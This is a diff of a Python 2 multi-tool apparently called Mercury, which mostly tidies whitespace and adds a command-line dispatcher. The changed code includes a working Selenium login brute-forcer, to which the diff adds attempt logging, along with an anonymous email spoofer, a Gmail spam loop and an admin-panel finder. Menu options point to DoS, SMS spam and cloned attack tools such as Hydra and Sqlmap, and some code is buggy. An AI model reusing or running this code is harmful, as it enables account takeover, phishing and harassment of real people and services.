@@ -3,6 +3,7 @@
 '''
 
 inspired by fsociety and Trity
+
 '''
 
 
@@ -21,6 +22,7 @@ try:
 	import hashlib
 	import requests
 	import platform
+	import argparse
 	import mechanize
 	import subprocess
 	from six.moves import urllib
@@ -32,26 +34,27 @@ except ImportError: #If you dont have the required modules this error will help 
 	print ('\033[4m Do you have all of the needed Modules ?')
 	time.sleep(1)
 	yn = raw_input('Would You Like To Install Them Now? y/n: ')
-	if yn == 'n': 
+	if yn == 'n':
 		pass
 	if yn == 'y':
-		os.system('pip install selenium')
-		os.system('pip install colorama')
-		os.system('pip install requests')
-		os.system('pip install urllib2')
-		os.system('pip install os')
-		os.system('pip install urllib')
-		os.system('pip install pygoogling')
-		os.system('pip install hashlib')
-		os.system('pip install smtplib')
-		os.system('pip install mechanize')
-		os.system('pip install subprocess')
-		os.system('pip install pygoogling')
+		os.system('pip2 install selenium')
+		os.system('pip2 install colorama')
+		os.system('pip2 install requests')
+		os.system('pip2 install urllib2')
+		os.system('pip2 install os')
+		os.system('pip2 install urllib')
+		os.system('pip2 install pygoogling')
+		os.system('pip2 install hashlib')
+		os.system('pip2 install smtplib')
+		os.system('pip2 install mechanize')
+		os.system('pip2 install subprocess')
+		os.system('pip2 install pygoogling')
 
 	'''
-	Allows the program to find the build  
+	Allows the program to find the build
 
 	'''
+
 class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
@@ -84,13 +87,13 @@ ip = socket.gethostbyname(socket.gethostname())
 results = subprocess.check_output(["netsh", "wlan", "show", "network"])
 
 termsAndConditions = Fore.RED + '''\033[4m Don`t Use Mercury To:
-create and share malicious viruses, illegally harm others computers, 
-interrupt wifi / bluetooth signals without permission, violate security, 
+create and share malicious viruses, illegally harm others computers,
+interrupt wifi / bluetooth signals without permission, violate security,
 and violate privacy
 
 '''
-#terms and condtions 
-            
+#terms and condtions
+
 def extra_long():
 	time.sleep(10) #Pause == 4 Secs
 def long():
@@ -102,7 +105,7 @@ def clear():
 	os.system('cls')
 def space():
 	print ' '
-	print ' '	
+	print ' '
 
 def agreement():
  afile = open(x+'\Extra\Mercury.txt','r+')
@@ -177,7 +180,7 @@ def sms():
 		long()
 		mainmenu()
 	except KeyboardInterrupt:
-		mainmenu()		  
+		mainmenu()
 def readme():
 	clear()
 	readme = open(x+'\README.md','r') #opens file
@@ -263,16 +266,16 @@ def websitess():
 	if attempt > 0:
 		pass
 	clear()
-	print (Fore.WHITE + color.BOLD +''' /$$       /$$           /$$                      
-| $$      |__/          | $$                      
-| $$       /$$ /$$$$$$$ | $$   /$$  /$$$$$$$      
-| $$      | $$| $$__  $$| $$  /$$/ /$$_____/      
-  \033[96m| $$      | $$| $$  \ $$| $$$$$$/ |  $$$$$$       
-| $$      | $$| $$  | $$| $$_  $$  \____  $$      
-| $$$$$$$$| $$| $$  | $$| $$ \  $$ /$$$$$$$/      
-|________/|__/|__/  |__/|__/  \__/|_______/       
-		                                                  
-		                                                  
+	print (Fore.WHITE + color.BOLD +''' /$$       /$$           /$$
+| $$      |__/          | $$
+| $$       /$$ /$$$$$$$ | $$   /$$  /$$$$$$$
+| $$      | $$| $$__  $$| $$  /$$/ /$$_____/
+  \033[96m| $$      | $$| $$  \ $$| $$$$$$/ |  $$$$$$
+| $$      | $$| $$  | $$| $$_  $$  \____  $$
+| $$$$$$$$| $$| $$  | $$| $$ \  $$ /$$$$$$$/
+|________/|__/|__/  |__/|__/  \__/|_______/
+
+
 		                                                  ''')
 	space()
 	print (Fore.WHITE + '''
@@ -343,23 +346,23 @@ def websitess():
 		browser.get('https://hackaday.com/')
 		websitess()
 	if ans_5 == '99':
-		attempt = 0 
+		attempt = 0
 		mainmenu()
 	else:
 		websitess()
 def toolss():
 	clear()
-	print (Fore.WHITE +  color.BOLD + ''' /$$$$$$$$                  /$$                       /$$      
-|__  $$__/                 | $$                      /$$/      
-   | $$  /$$$$$$   /$$$$$$ | $$  /$$$$$$$           /$$/       
-   | $$ /$$__  $$ /$$__  $$| $$ /$$_____/          /$$/        
-   | $$| $$  \ $$| $$  \ $$| $$|  $$$$$$          /$$/         
-   \033[96m| $$| $$  | $$| $$  | $$| $$ \____  $$        /$$/          
-   | $$|  $$$$$$/|  $$$$$$/| $$ /$$$$$$$/       /$$/           
-   |__/ \______/  \______/ |__/|_______/       |__/            
-                                                               
-                                                               
-                                                               
+	print (Fore.WHITE +  color.BOLD + ''' /$$$$$$$$                  /$$                       /$$
+|__  $$__/                 | $$                      /$$/
+   | $$  /$$$$$$   /$$$$$$ | $$  /$$$$$$$           /$$/
+   | $$ /$$__  $$ /$$__  $$| $$ /$$_____/          /$$/
+   | $$| $$  \ $$| $$  \ $$| $$|  $$$$$$          /$$/
+   \033[96m| $$| $$  | $$| $$  | $$| $$ \____  $$        /$$/
+   | $$|  $$$$$$/|  $$$$$$/| $$ /$$$$$$$/       /$$/
+   |__/ \______/  \______/ |__/|_______/       |__/
+
+
+
                                            ''')
 	space()
 	print (Fore.WHITE + '''
@@ -371,11 +374,11 @@ def toolss():
 	[5]\033[96m Reaver \033[1;37;40m		[14]\033[96m Wpscan\033[1;37;40m
 	[6]\033[96m InstaBrute \033[1;37;40m 	[15]\033[96m Cupp\033[1;37;40m
 	[7]\033[96m Cl0neMas3r \033[1;37;40m 	[16]\033[96m Hydra\033[1;37;40m
-	[8]\033[96m Sqlmap \033[1;37;40m		
+	[8]\033[96m Sqlmap \033[1;37;40m
 
 
 	[100]\033[96m Install All\033[1;37;40m	[99]\033[96m Exit submenu\033[1;37;40m
-								      
+
 		                        ''')
 	ans_2 = raw_input('Tools ~# ')
 	if ans_2 == '0':
@@ -389,7 +392,7 @@ def toolss():
 			os.system('git clone https://github.com/MetaChar/Mercury '+x+'/Tools/Mercury')
 			toolss()
 		except KeyboardInterrupt:
-			toolss()	
+			toolss()
 	if ans_2 == '2':
 		try:
 			os.system('git clone https://github.com/nmap/nmap '+x+'/Tools/Nmap')
@@ -586,7 +589,7 @@ def sourcecode():
 		quick()
 		clear()
 		html.close()
-		html1.close()		
+		html1.close()
 		mainmenu()
 	except KeyboardInterrupt:
 		print ('Stopped! ')
@@ -632,11 +635,14 @@ def brute_force(): #Declares Function
 	options.add_argument('--hide-scrollbars')
 	options.add_argument('--disable-gpu')
 	browser = webdriver.Chrome(chrome_options=options) #Opens Chrome
+	data_store = raw_input(Fore.CYAN + 'Would You like to store the data in an html file y/n ')
 	username = raw_input(Fore.CYAN + '	What is the Username? ') #Username
 	USS = raw_input('		What is the CSS Selector for the Username? ') #CSS Selector Username
 	PSS = raw_input(' 			What is the CSS Selector for the Password? ') #CSS Selector Password
 	SSS  = raw_input ('				What is the CSS Selector for the Submit Button? ') #CSS Selector Submit
 	url4 = raw_input('					What is the Url? ') #URL Requests
+	if data_store == 'y':
+		log_file = open (x+"\Resources\BruteForce.txt", 'w')
 	browser.get(url4)
 	count = 1 #count
 	while True:
@@ -644,13 +650,13 @@ def brute_force(): #Declares Function
 			browser.get(url4)
 			Sel_user = browser.find_element_by_css_selector(USS) #Finds Selector
 			Sel_pas = browser.find_element_by_css_selector(PSS) #Finds Selector
-			enter = browser.find_element_by_css_selector(SSS) #Finds Selector 
+			enter = browser.find_element_by_css_selector(SSS) #Finds Selector
 			quick() #Pause
 			line = f.read(count) #Password Lines
 			for line in f:
 				Sel_user = browser.find_element_by_css_selector(USS) #Finds Selector
 				Sel_pas = browser.find_element_by_css_selector(PSS) #Finds Selector
-				enter = browser.find_element_by_css_selector(SSS) #Finds Selector 
+				enter = browser.find_element_by_css_selector(SSS) #Finds Selector
 				Sel_user.send_keys(username) #Sends Username
 				quick()
 				Sel_pas.send_keys(line) #Sends Password
@@ -659,16 +665,21 @@ def brute_force(): #Declares Function
 				print (Fore.CYAN + '#-----------------------------#')
 				print (Fore.WHITE + 'Tried Password: ' +line+ 'For User:' +username) #Displays Data
 				print (Fore.CYAN +'# ----------------------------#')
+				if data_store == 'y':
+					print  >>log_file, 'User: '+username+'Password: '+line +'\n'
 				count =+ 1 #Counts +1
-		except IOError: #unknown error by me 
+		except IOError: #unknown error by me
 			print ('There was a random error sorry! ')
 			quick()
 			mainmenu()
 			f.close()
+			log_file.close()
 		except KeyboardInterrupt: #returns to main menu if ctrl C is used
+			log_file.close()
 			f.close()
 			mainmenu()
 		except:
+			log_file.close()
 			print ('Url not found or selector not found.')
 			long()
 			mainmenu()
@@ -684,16 +695,16 @@ def admin():
 			req = Request(website2)
 	    		response = urlopen(req)
 		except HTTPError as e:
-			print(Fore.RED  + website2) 
+			print(Fore.RED  + website2)
 			count4 += 1
 		except URLError as e:
-    			print(Fore.RED + website2) 
+    			print(Fore.RED + website2)
     			count4 += 1
     		except  KeyboardInterrupt:
     			mainmenu()
     			links.close()
 		else:
-   			print(Fore.GREEN + website2) 
+   			print(Fore.GREEN + website2)
    			count4 += 1
 def hash():
 
@@ -725,7 +736,7 @@ def hex():
 	if choice == 'e':
 		encode1()
 	if choice == 'd':
-		decode1() 
+		decode1()
 def encode1():
 	Str = raw_input(Fore.CYAN + 'String to encode: ')
 	Str = Str.encode('hex','strict');
@@ -733,11 +744,18 @@ def encode1():
 	long()
 	mainmenu()
 def decode1():
-    Str = raw_input(Fore.CYAN + 'String to decode: ' )
-    Str = Str.decode('hex','strict');
-    print "Decoded String: %s" % Str
-    long()
-    mainmenu()
+	try:
+	    Str = raw_input(Fore.CYAN + 'String to decode: ' )
+	    Str = Str.decode('hex','strict');
+	    print "Decoded String: %s" % Str
+	    long()
+	    mainmenu()
+	except TypeError:
+		print (Fore.RED + 'Could not decode!')
+		quick()
+		mainmenu()
+	except KeyboardInterrupt:
+		mainmenu()
 def ipaddress():
 	try:
 		url2 = raw_input(Fore.CYAN +"Enter a website url ") #User Input
@@ -818,12 +836,12 @@ def myip():
 	mainmenu()
 def pip_installer():
 	try:
-		pip = raw_input(Fore.CYAN + '	What Pip would you like to install: ') #what pip 
+		pip = raw_input(Fore.CYAN + '	What Pip would you like to install: ') #what pip
 		os.system('pip install ' +pip) #installs pip
 		time.sleep(1)
 		clear()
 		mainmenu()
-	except KeyboardInterrupt: 
+	except KeyboardInterrupt:
 		print ('Stopped! ')
 		quick()
 		mainmenu()
@@ -845,7 +863,7 @@ def github():
 		mainmenu()
 def exit():
 	sys.exit()
-def geoLocationp(): 
+def geoLocationp():
 	try:
 		target = raw_input(Fore.CYAN + '	Enter an ip address: ') #User Input
 		send_url = 'http://freegeoip.net/json/'+target #Finds Targets
@@ -867,14 +885,14 @@ def geoLocationp():
 		prompt()
 def emailspoofsetup():
 	br = mechanize.Browser()
-	 
+
 	to = raw_input(Fore.CYAN + "Enter the recipient address: ")
 	subject = raw_input("Enter the subject: ")
 	print "Message: "
 	message = raw_input(">")
-	 
+
 	#proxy = "http://127.0.0.1:8080"
-	 
+
 	url = "http://anonymouse.org/anonemail.html"
 	headers = "Mozilla/4.0 (compatible; MSIE 5.0; AOL 4.0; Windows 95; c_athome)"
 	br.addheaders = [('User-agent', headers)]
@@ -887,18 +905,18 @@ def emailspoofsetup():
 	br.set_debug_http(False)
 	br.set_debug_redirects(False)
 	#br.set_proxies({"http": proxy})
-	 
+
 	br.select_form(nr=0)
-	 
+
 	br.form['to'] = to
 	br.form['subject'] = subject
 	br.form['text'] = message
-	 
+
 	result = br.submit()
-	 
+
 	response = br.response().read()
-	 
-	 
+
+
 	if "The e-mail has been sent anonymously!" in response:
 	    print "The email has been sent successfully!! \n The recipient will get it in 12 hours!!"
 	    long()
@@ -915,8 +933,8 @@ def emailspam():
 		reciever = raw_input('Who do you want to send this to? ')
 		server = smtplib.SMTP('smtp.gmail.com', 587) #server
 		server.ehlo() #starts server
-		to = [sender, reciever]  
-		subject = 'MetaChar'  
+		to = [sender, reciever]
+		subject = 'MetaChar'
 		body = 'MERCURY'
 		server.starttls()
 		server.login(sender, password)
@@ -936,7 +954,7 @@ def emailspam():
 		except KeyboardInterrupt:
 			mainmenu()
 
-def geoLocation(): 
+def geoLocation():
 	try:
 		target = raw_input(Fore.CYAN + '	Enter an ip address: ') #User Input
 		send_url = 'http://freegeoip.net/json/'+target #Finds Targets
@@ -961,7 +979,7 @@ def geoLocation():
 	except KeyboardInterrupt:
 		mainmenu()
 def file():
-	dirt = raw_input(Fore.CYAN + '		Enter a file location: ') 
+	dirt = raw_input(Fore.CYAN + '		Enter a file location: ')
 	t = os.listdir(dirt) #Change To Ls For Linux Users
 	count = 0
 	space()
@@ -1008,11 +1026,11 @@ proxys_num2 = 0
 proxys_num = 0
 def mainmenu():
 	clear()
-	print (Fore.WHITE +  color.BOLD + '''  /$$      /$$                                                            
- | $$$    /$$$                                                            
+	print (Fore.WHITE +  color.BOLD + '''  /$$      /$$
+ | $$$    /$$$
  | $$$$  /$$$$  /$$$$$$   /$$$$$$   /$$$$$$$ /$$   /$$  /$$$$$$  /$$   /$$
  | $$ $$/$$ $$ /$$__  $$ /$$__  $$ /$$_____/| $$  | $$ /$$__  $$| $$  | $$
- | $$  $$$| $$| $$$$$$$$| $$  \__/| $$      | $$  | $$| $$  \__/| $$  | $$ 
+ | $$  $$$| $$| $$$$$$$$| $$  \__/| $$      | $$  | $$| $$  \__/| $$  | $$
 \033[96m | $$\  $ | $$| $$_____/| $$      | $$      | $$  | $$| $$      | $$  | $$
  | $$ \/  | $$|  $$$$$$$| $$      |  $$$$$$$|  $$$$$$/| $$      |  $$$$$$$
  |__/     |__/ \_______/|__/       \_______/ \______/ |__/       \____  $$
@@ -1031,8 +1049,8 @@ def mainmenu():
 	[6]\033[96m File explorer \033[1;37;40m			[15]\033[96m Proxy Scraper \033[1;37;40m                     [24]\033[96m SMS Spam\033[1;37;40m
 	[7]\033[96m GitHub cloner \033[1;37;40m			[16]\033[96m Google Dorks\033[1;37;40m  	  	        [25]\033[96m Websites \033[1;37;40m
 	[8]\033[96m Pip installer \033[1;37;40m 			[17]\033[96m Proxy Browser\033[1;37;40m 	                [26]\033[96m Twitter Info Grabber \033[1;37;40m
-		              
-	[100]\033[96m Update\033[1;37;40m	[99]\033[96m Exit tool\033[1;37;40m	
+
+	[100]\033[96m Update\033[1;37;40m	[99]\033[96m Exit tool\033[1;37;40m
 	''')
 	ans = raw_input(Fore.WHITE + 'Enter a choice  ~# ')
 	if ans == '0':
@@ -1118,6 +1136,62 @@ def PlatformCheck():
 		long()
 		agreement()
 try:
+	if sys.argv[1] == 'mainmenu':
+		mainmenu()
+	if sys.argv[1] == 'readme':
+		readme()
+	if sys.argv[1] == 'bruteforce':
+		brute_force()
+	if sys.argv[1] == 'port':
+		listen()
+	if sys.argv[1] == 'geolocation':
+		geoLocation()
+	if sys.argv[1] == 'mac':
+		mac()
+	if sys.argv[1] == 'status':
+		networksweb()
+	if sys.argv[1] == 'file':
+		file()
+	if sys.argv[1] == 'github':
+		github()
+	if sys.argv[1] == 'pip':
+		pip_installe()
+	if sys.argv[1] == 'source':
+		sourcecode()
+	if sys.argv[1] == 'ip':
+		ipaddress()
+	if sys.argv[1] == 'sublink':
+		sub_link()
+	if sys.argv[1] == 'hash':
+		hash()
+	if sys.argv[1] == 'tools':
+		toolss()
+	if sys.argv[1] == 'proxy':
+		proxys()
+	if sys.argv[1] == 'dork':
+		dork1()
+	if sys.argv[1] == 'browser':
+		webbrowserfunc()
+	if sys.argv[1] == 'spam':
+		emailspam()
+	if sys.argv[1] == 'spoof':
+		emailspoofsetup()
+	if sys.argv[1] == 'site':
+		siteexists()
+	if sys.argv[1] == 'encode':
+		encode1()
+	if sys.argv[1] == 'decode':
+		decode1()
+	if sys.argv[1] == 'pannel':
+		admin()
+	if sys.argv[1] == 'dos':
+		ddos()
+	if sys.argv[1] == 'sms':
+		sms()
+	if sys.argv[1] == 'websites':
+		websitess()
+	if sys.argv[1] == 'twitter':
+		twitter()
 	attempt = 0
 	InternetCheck()
 	PlatformCheck()
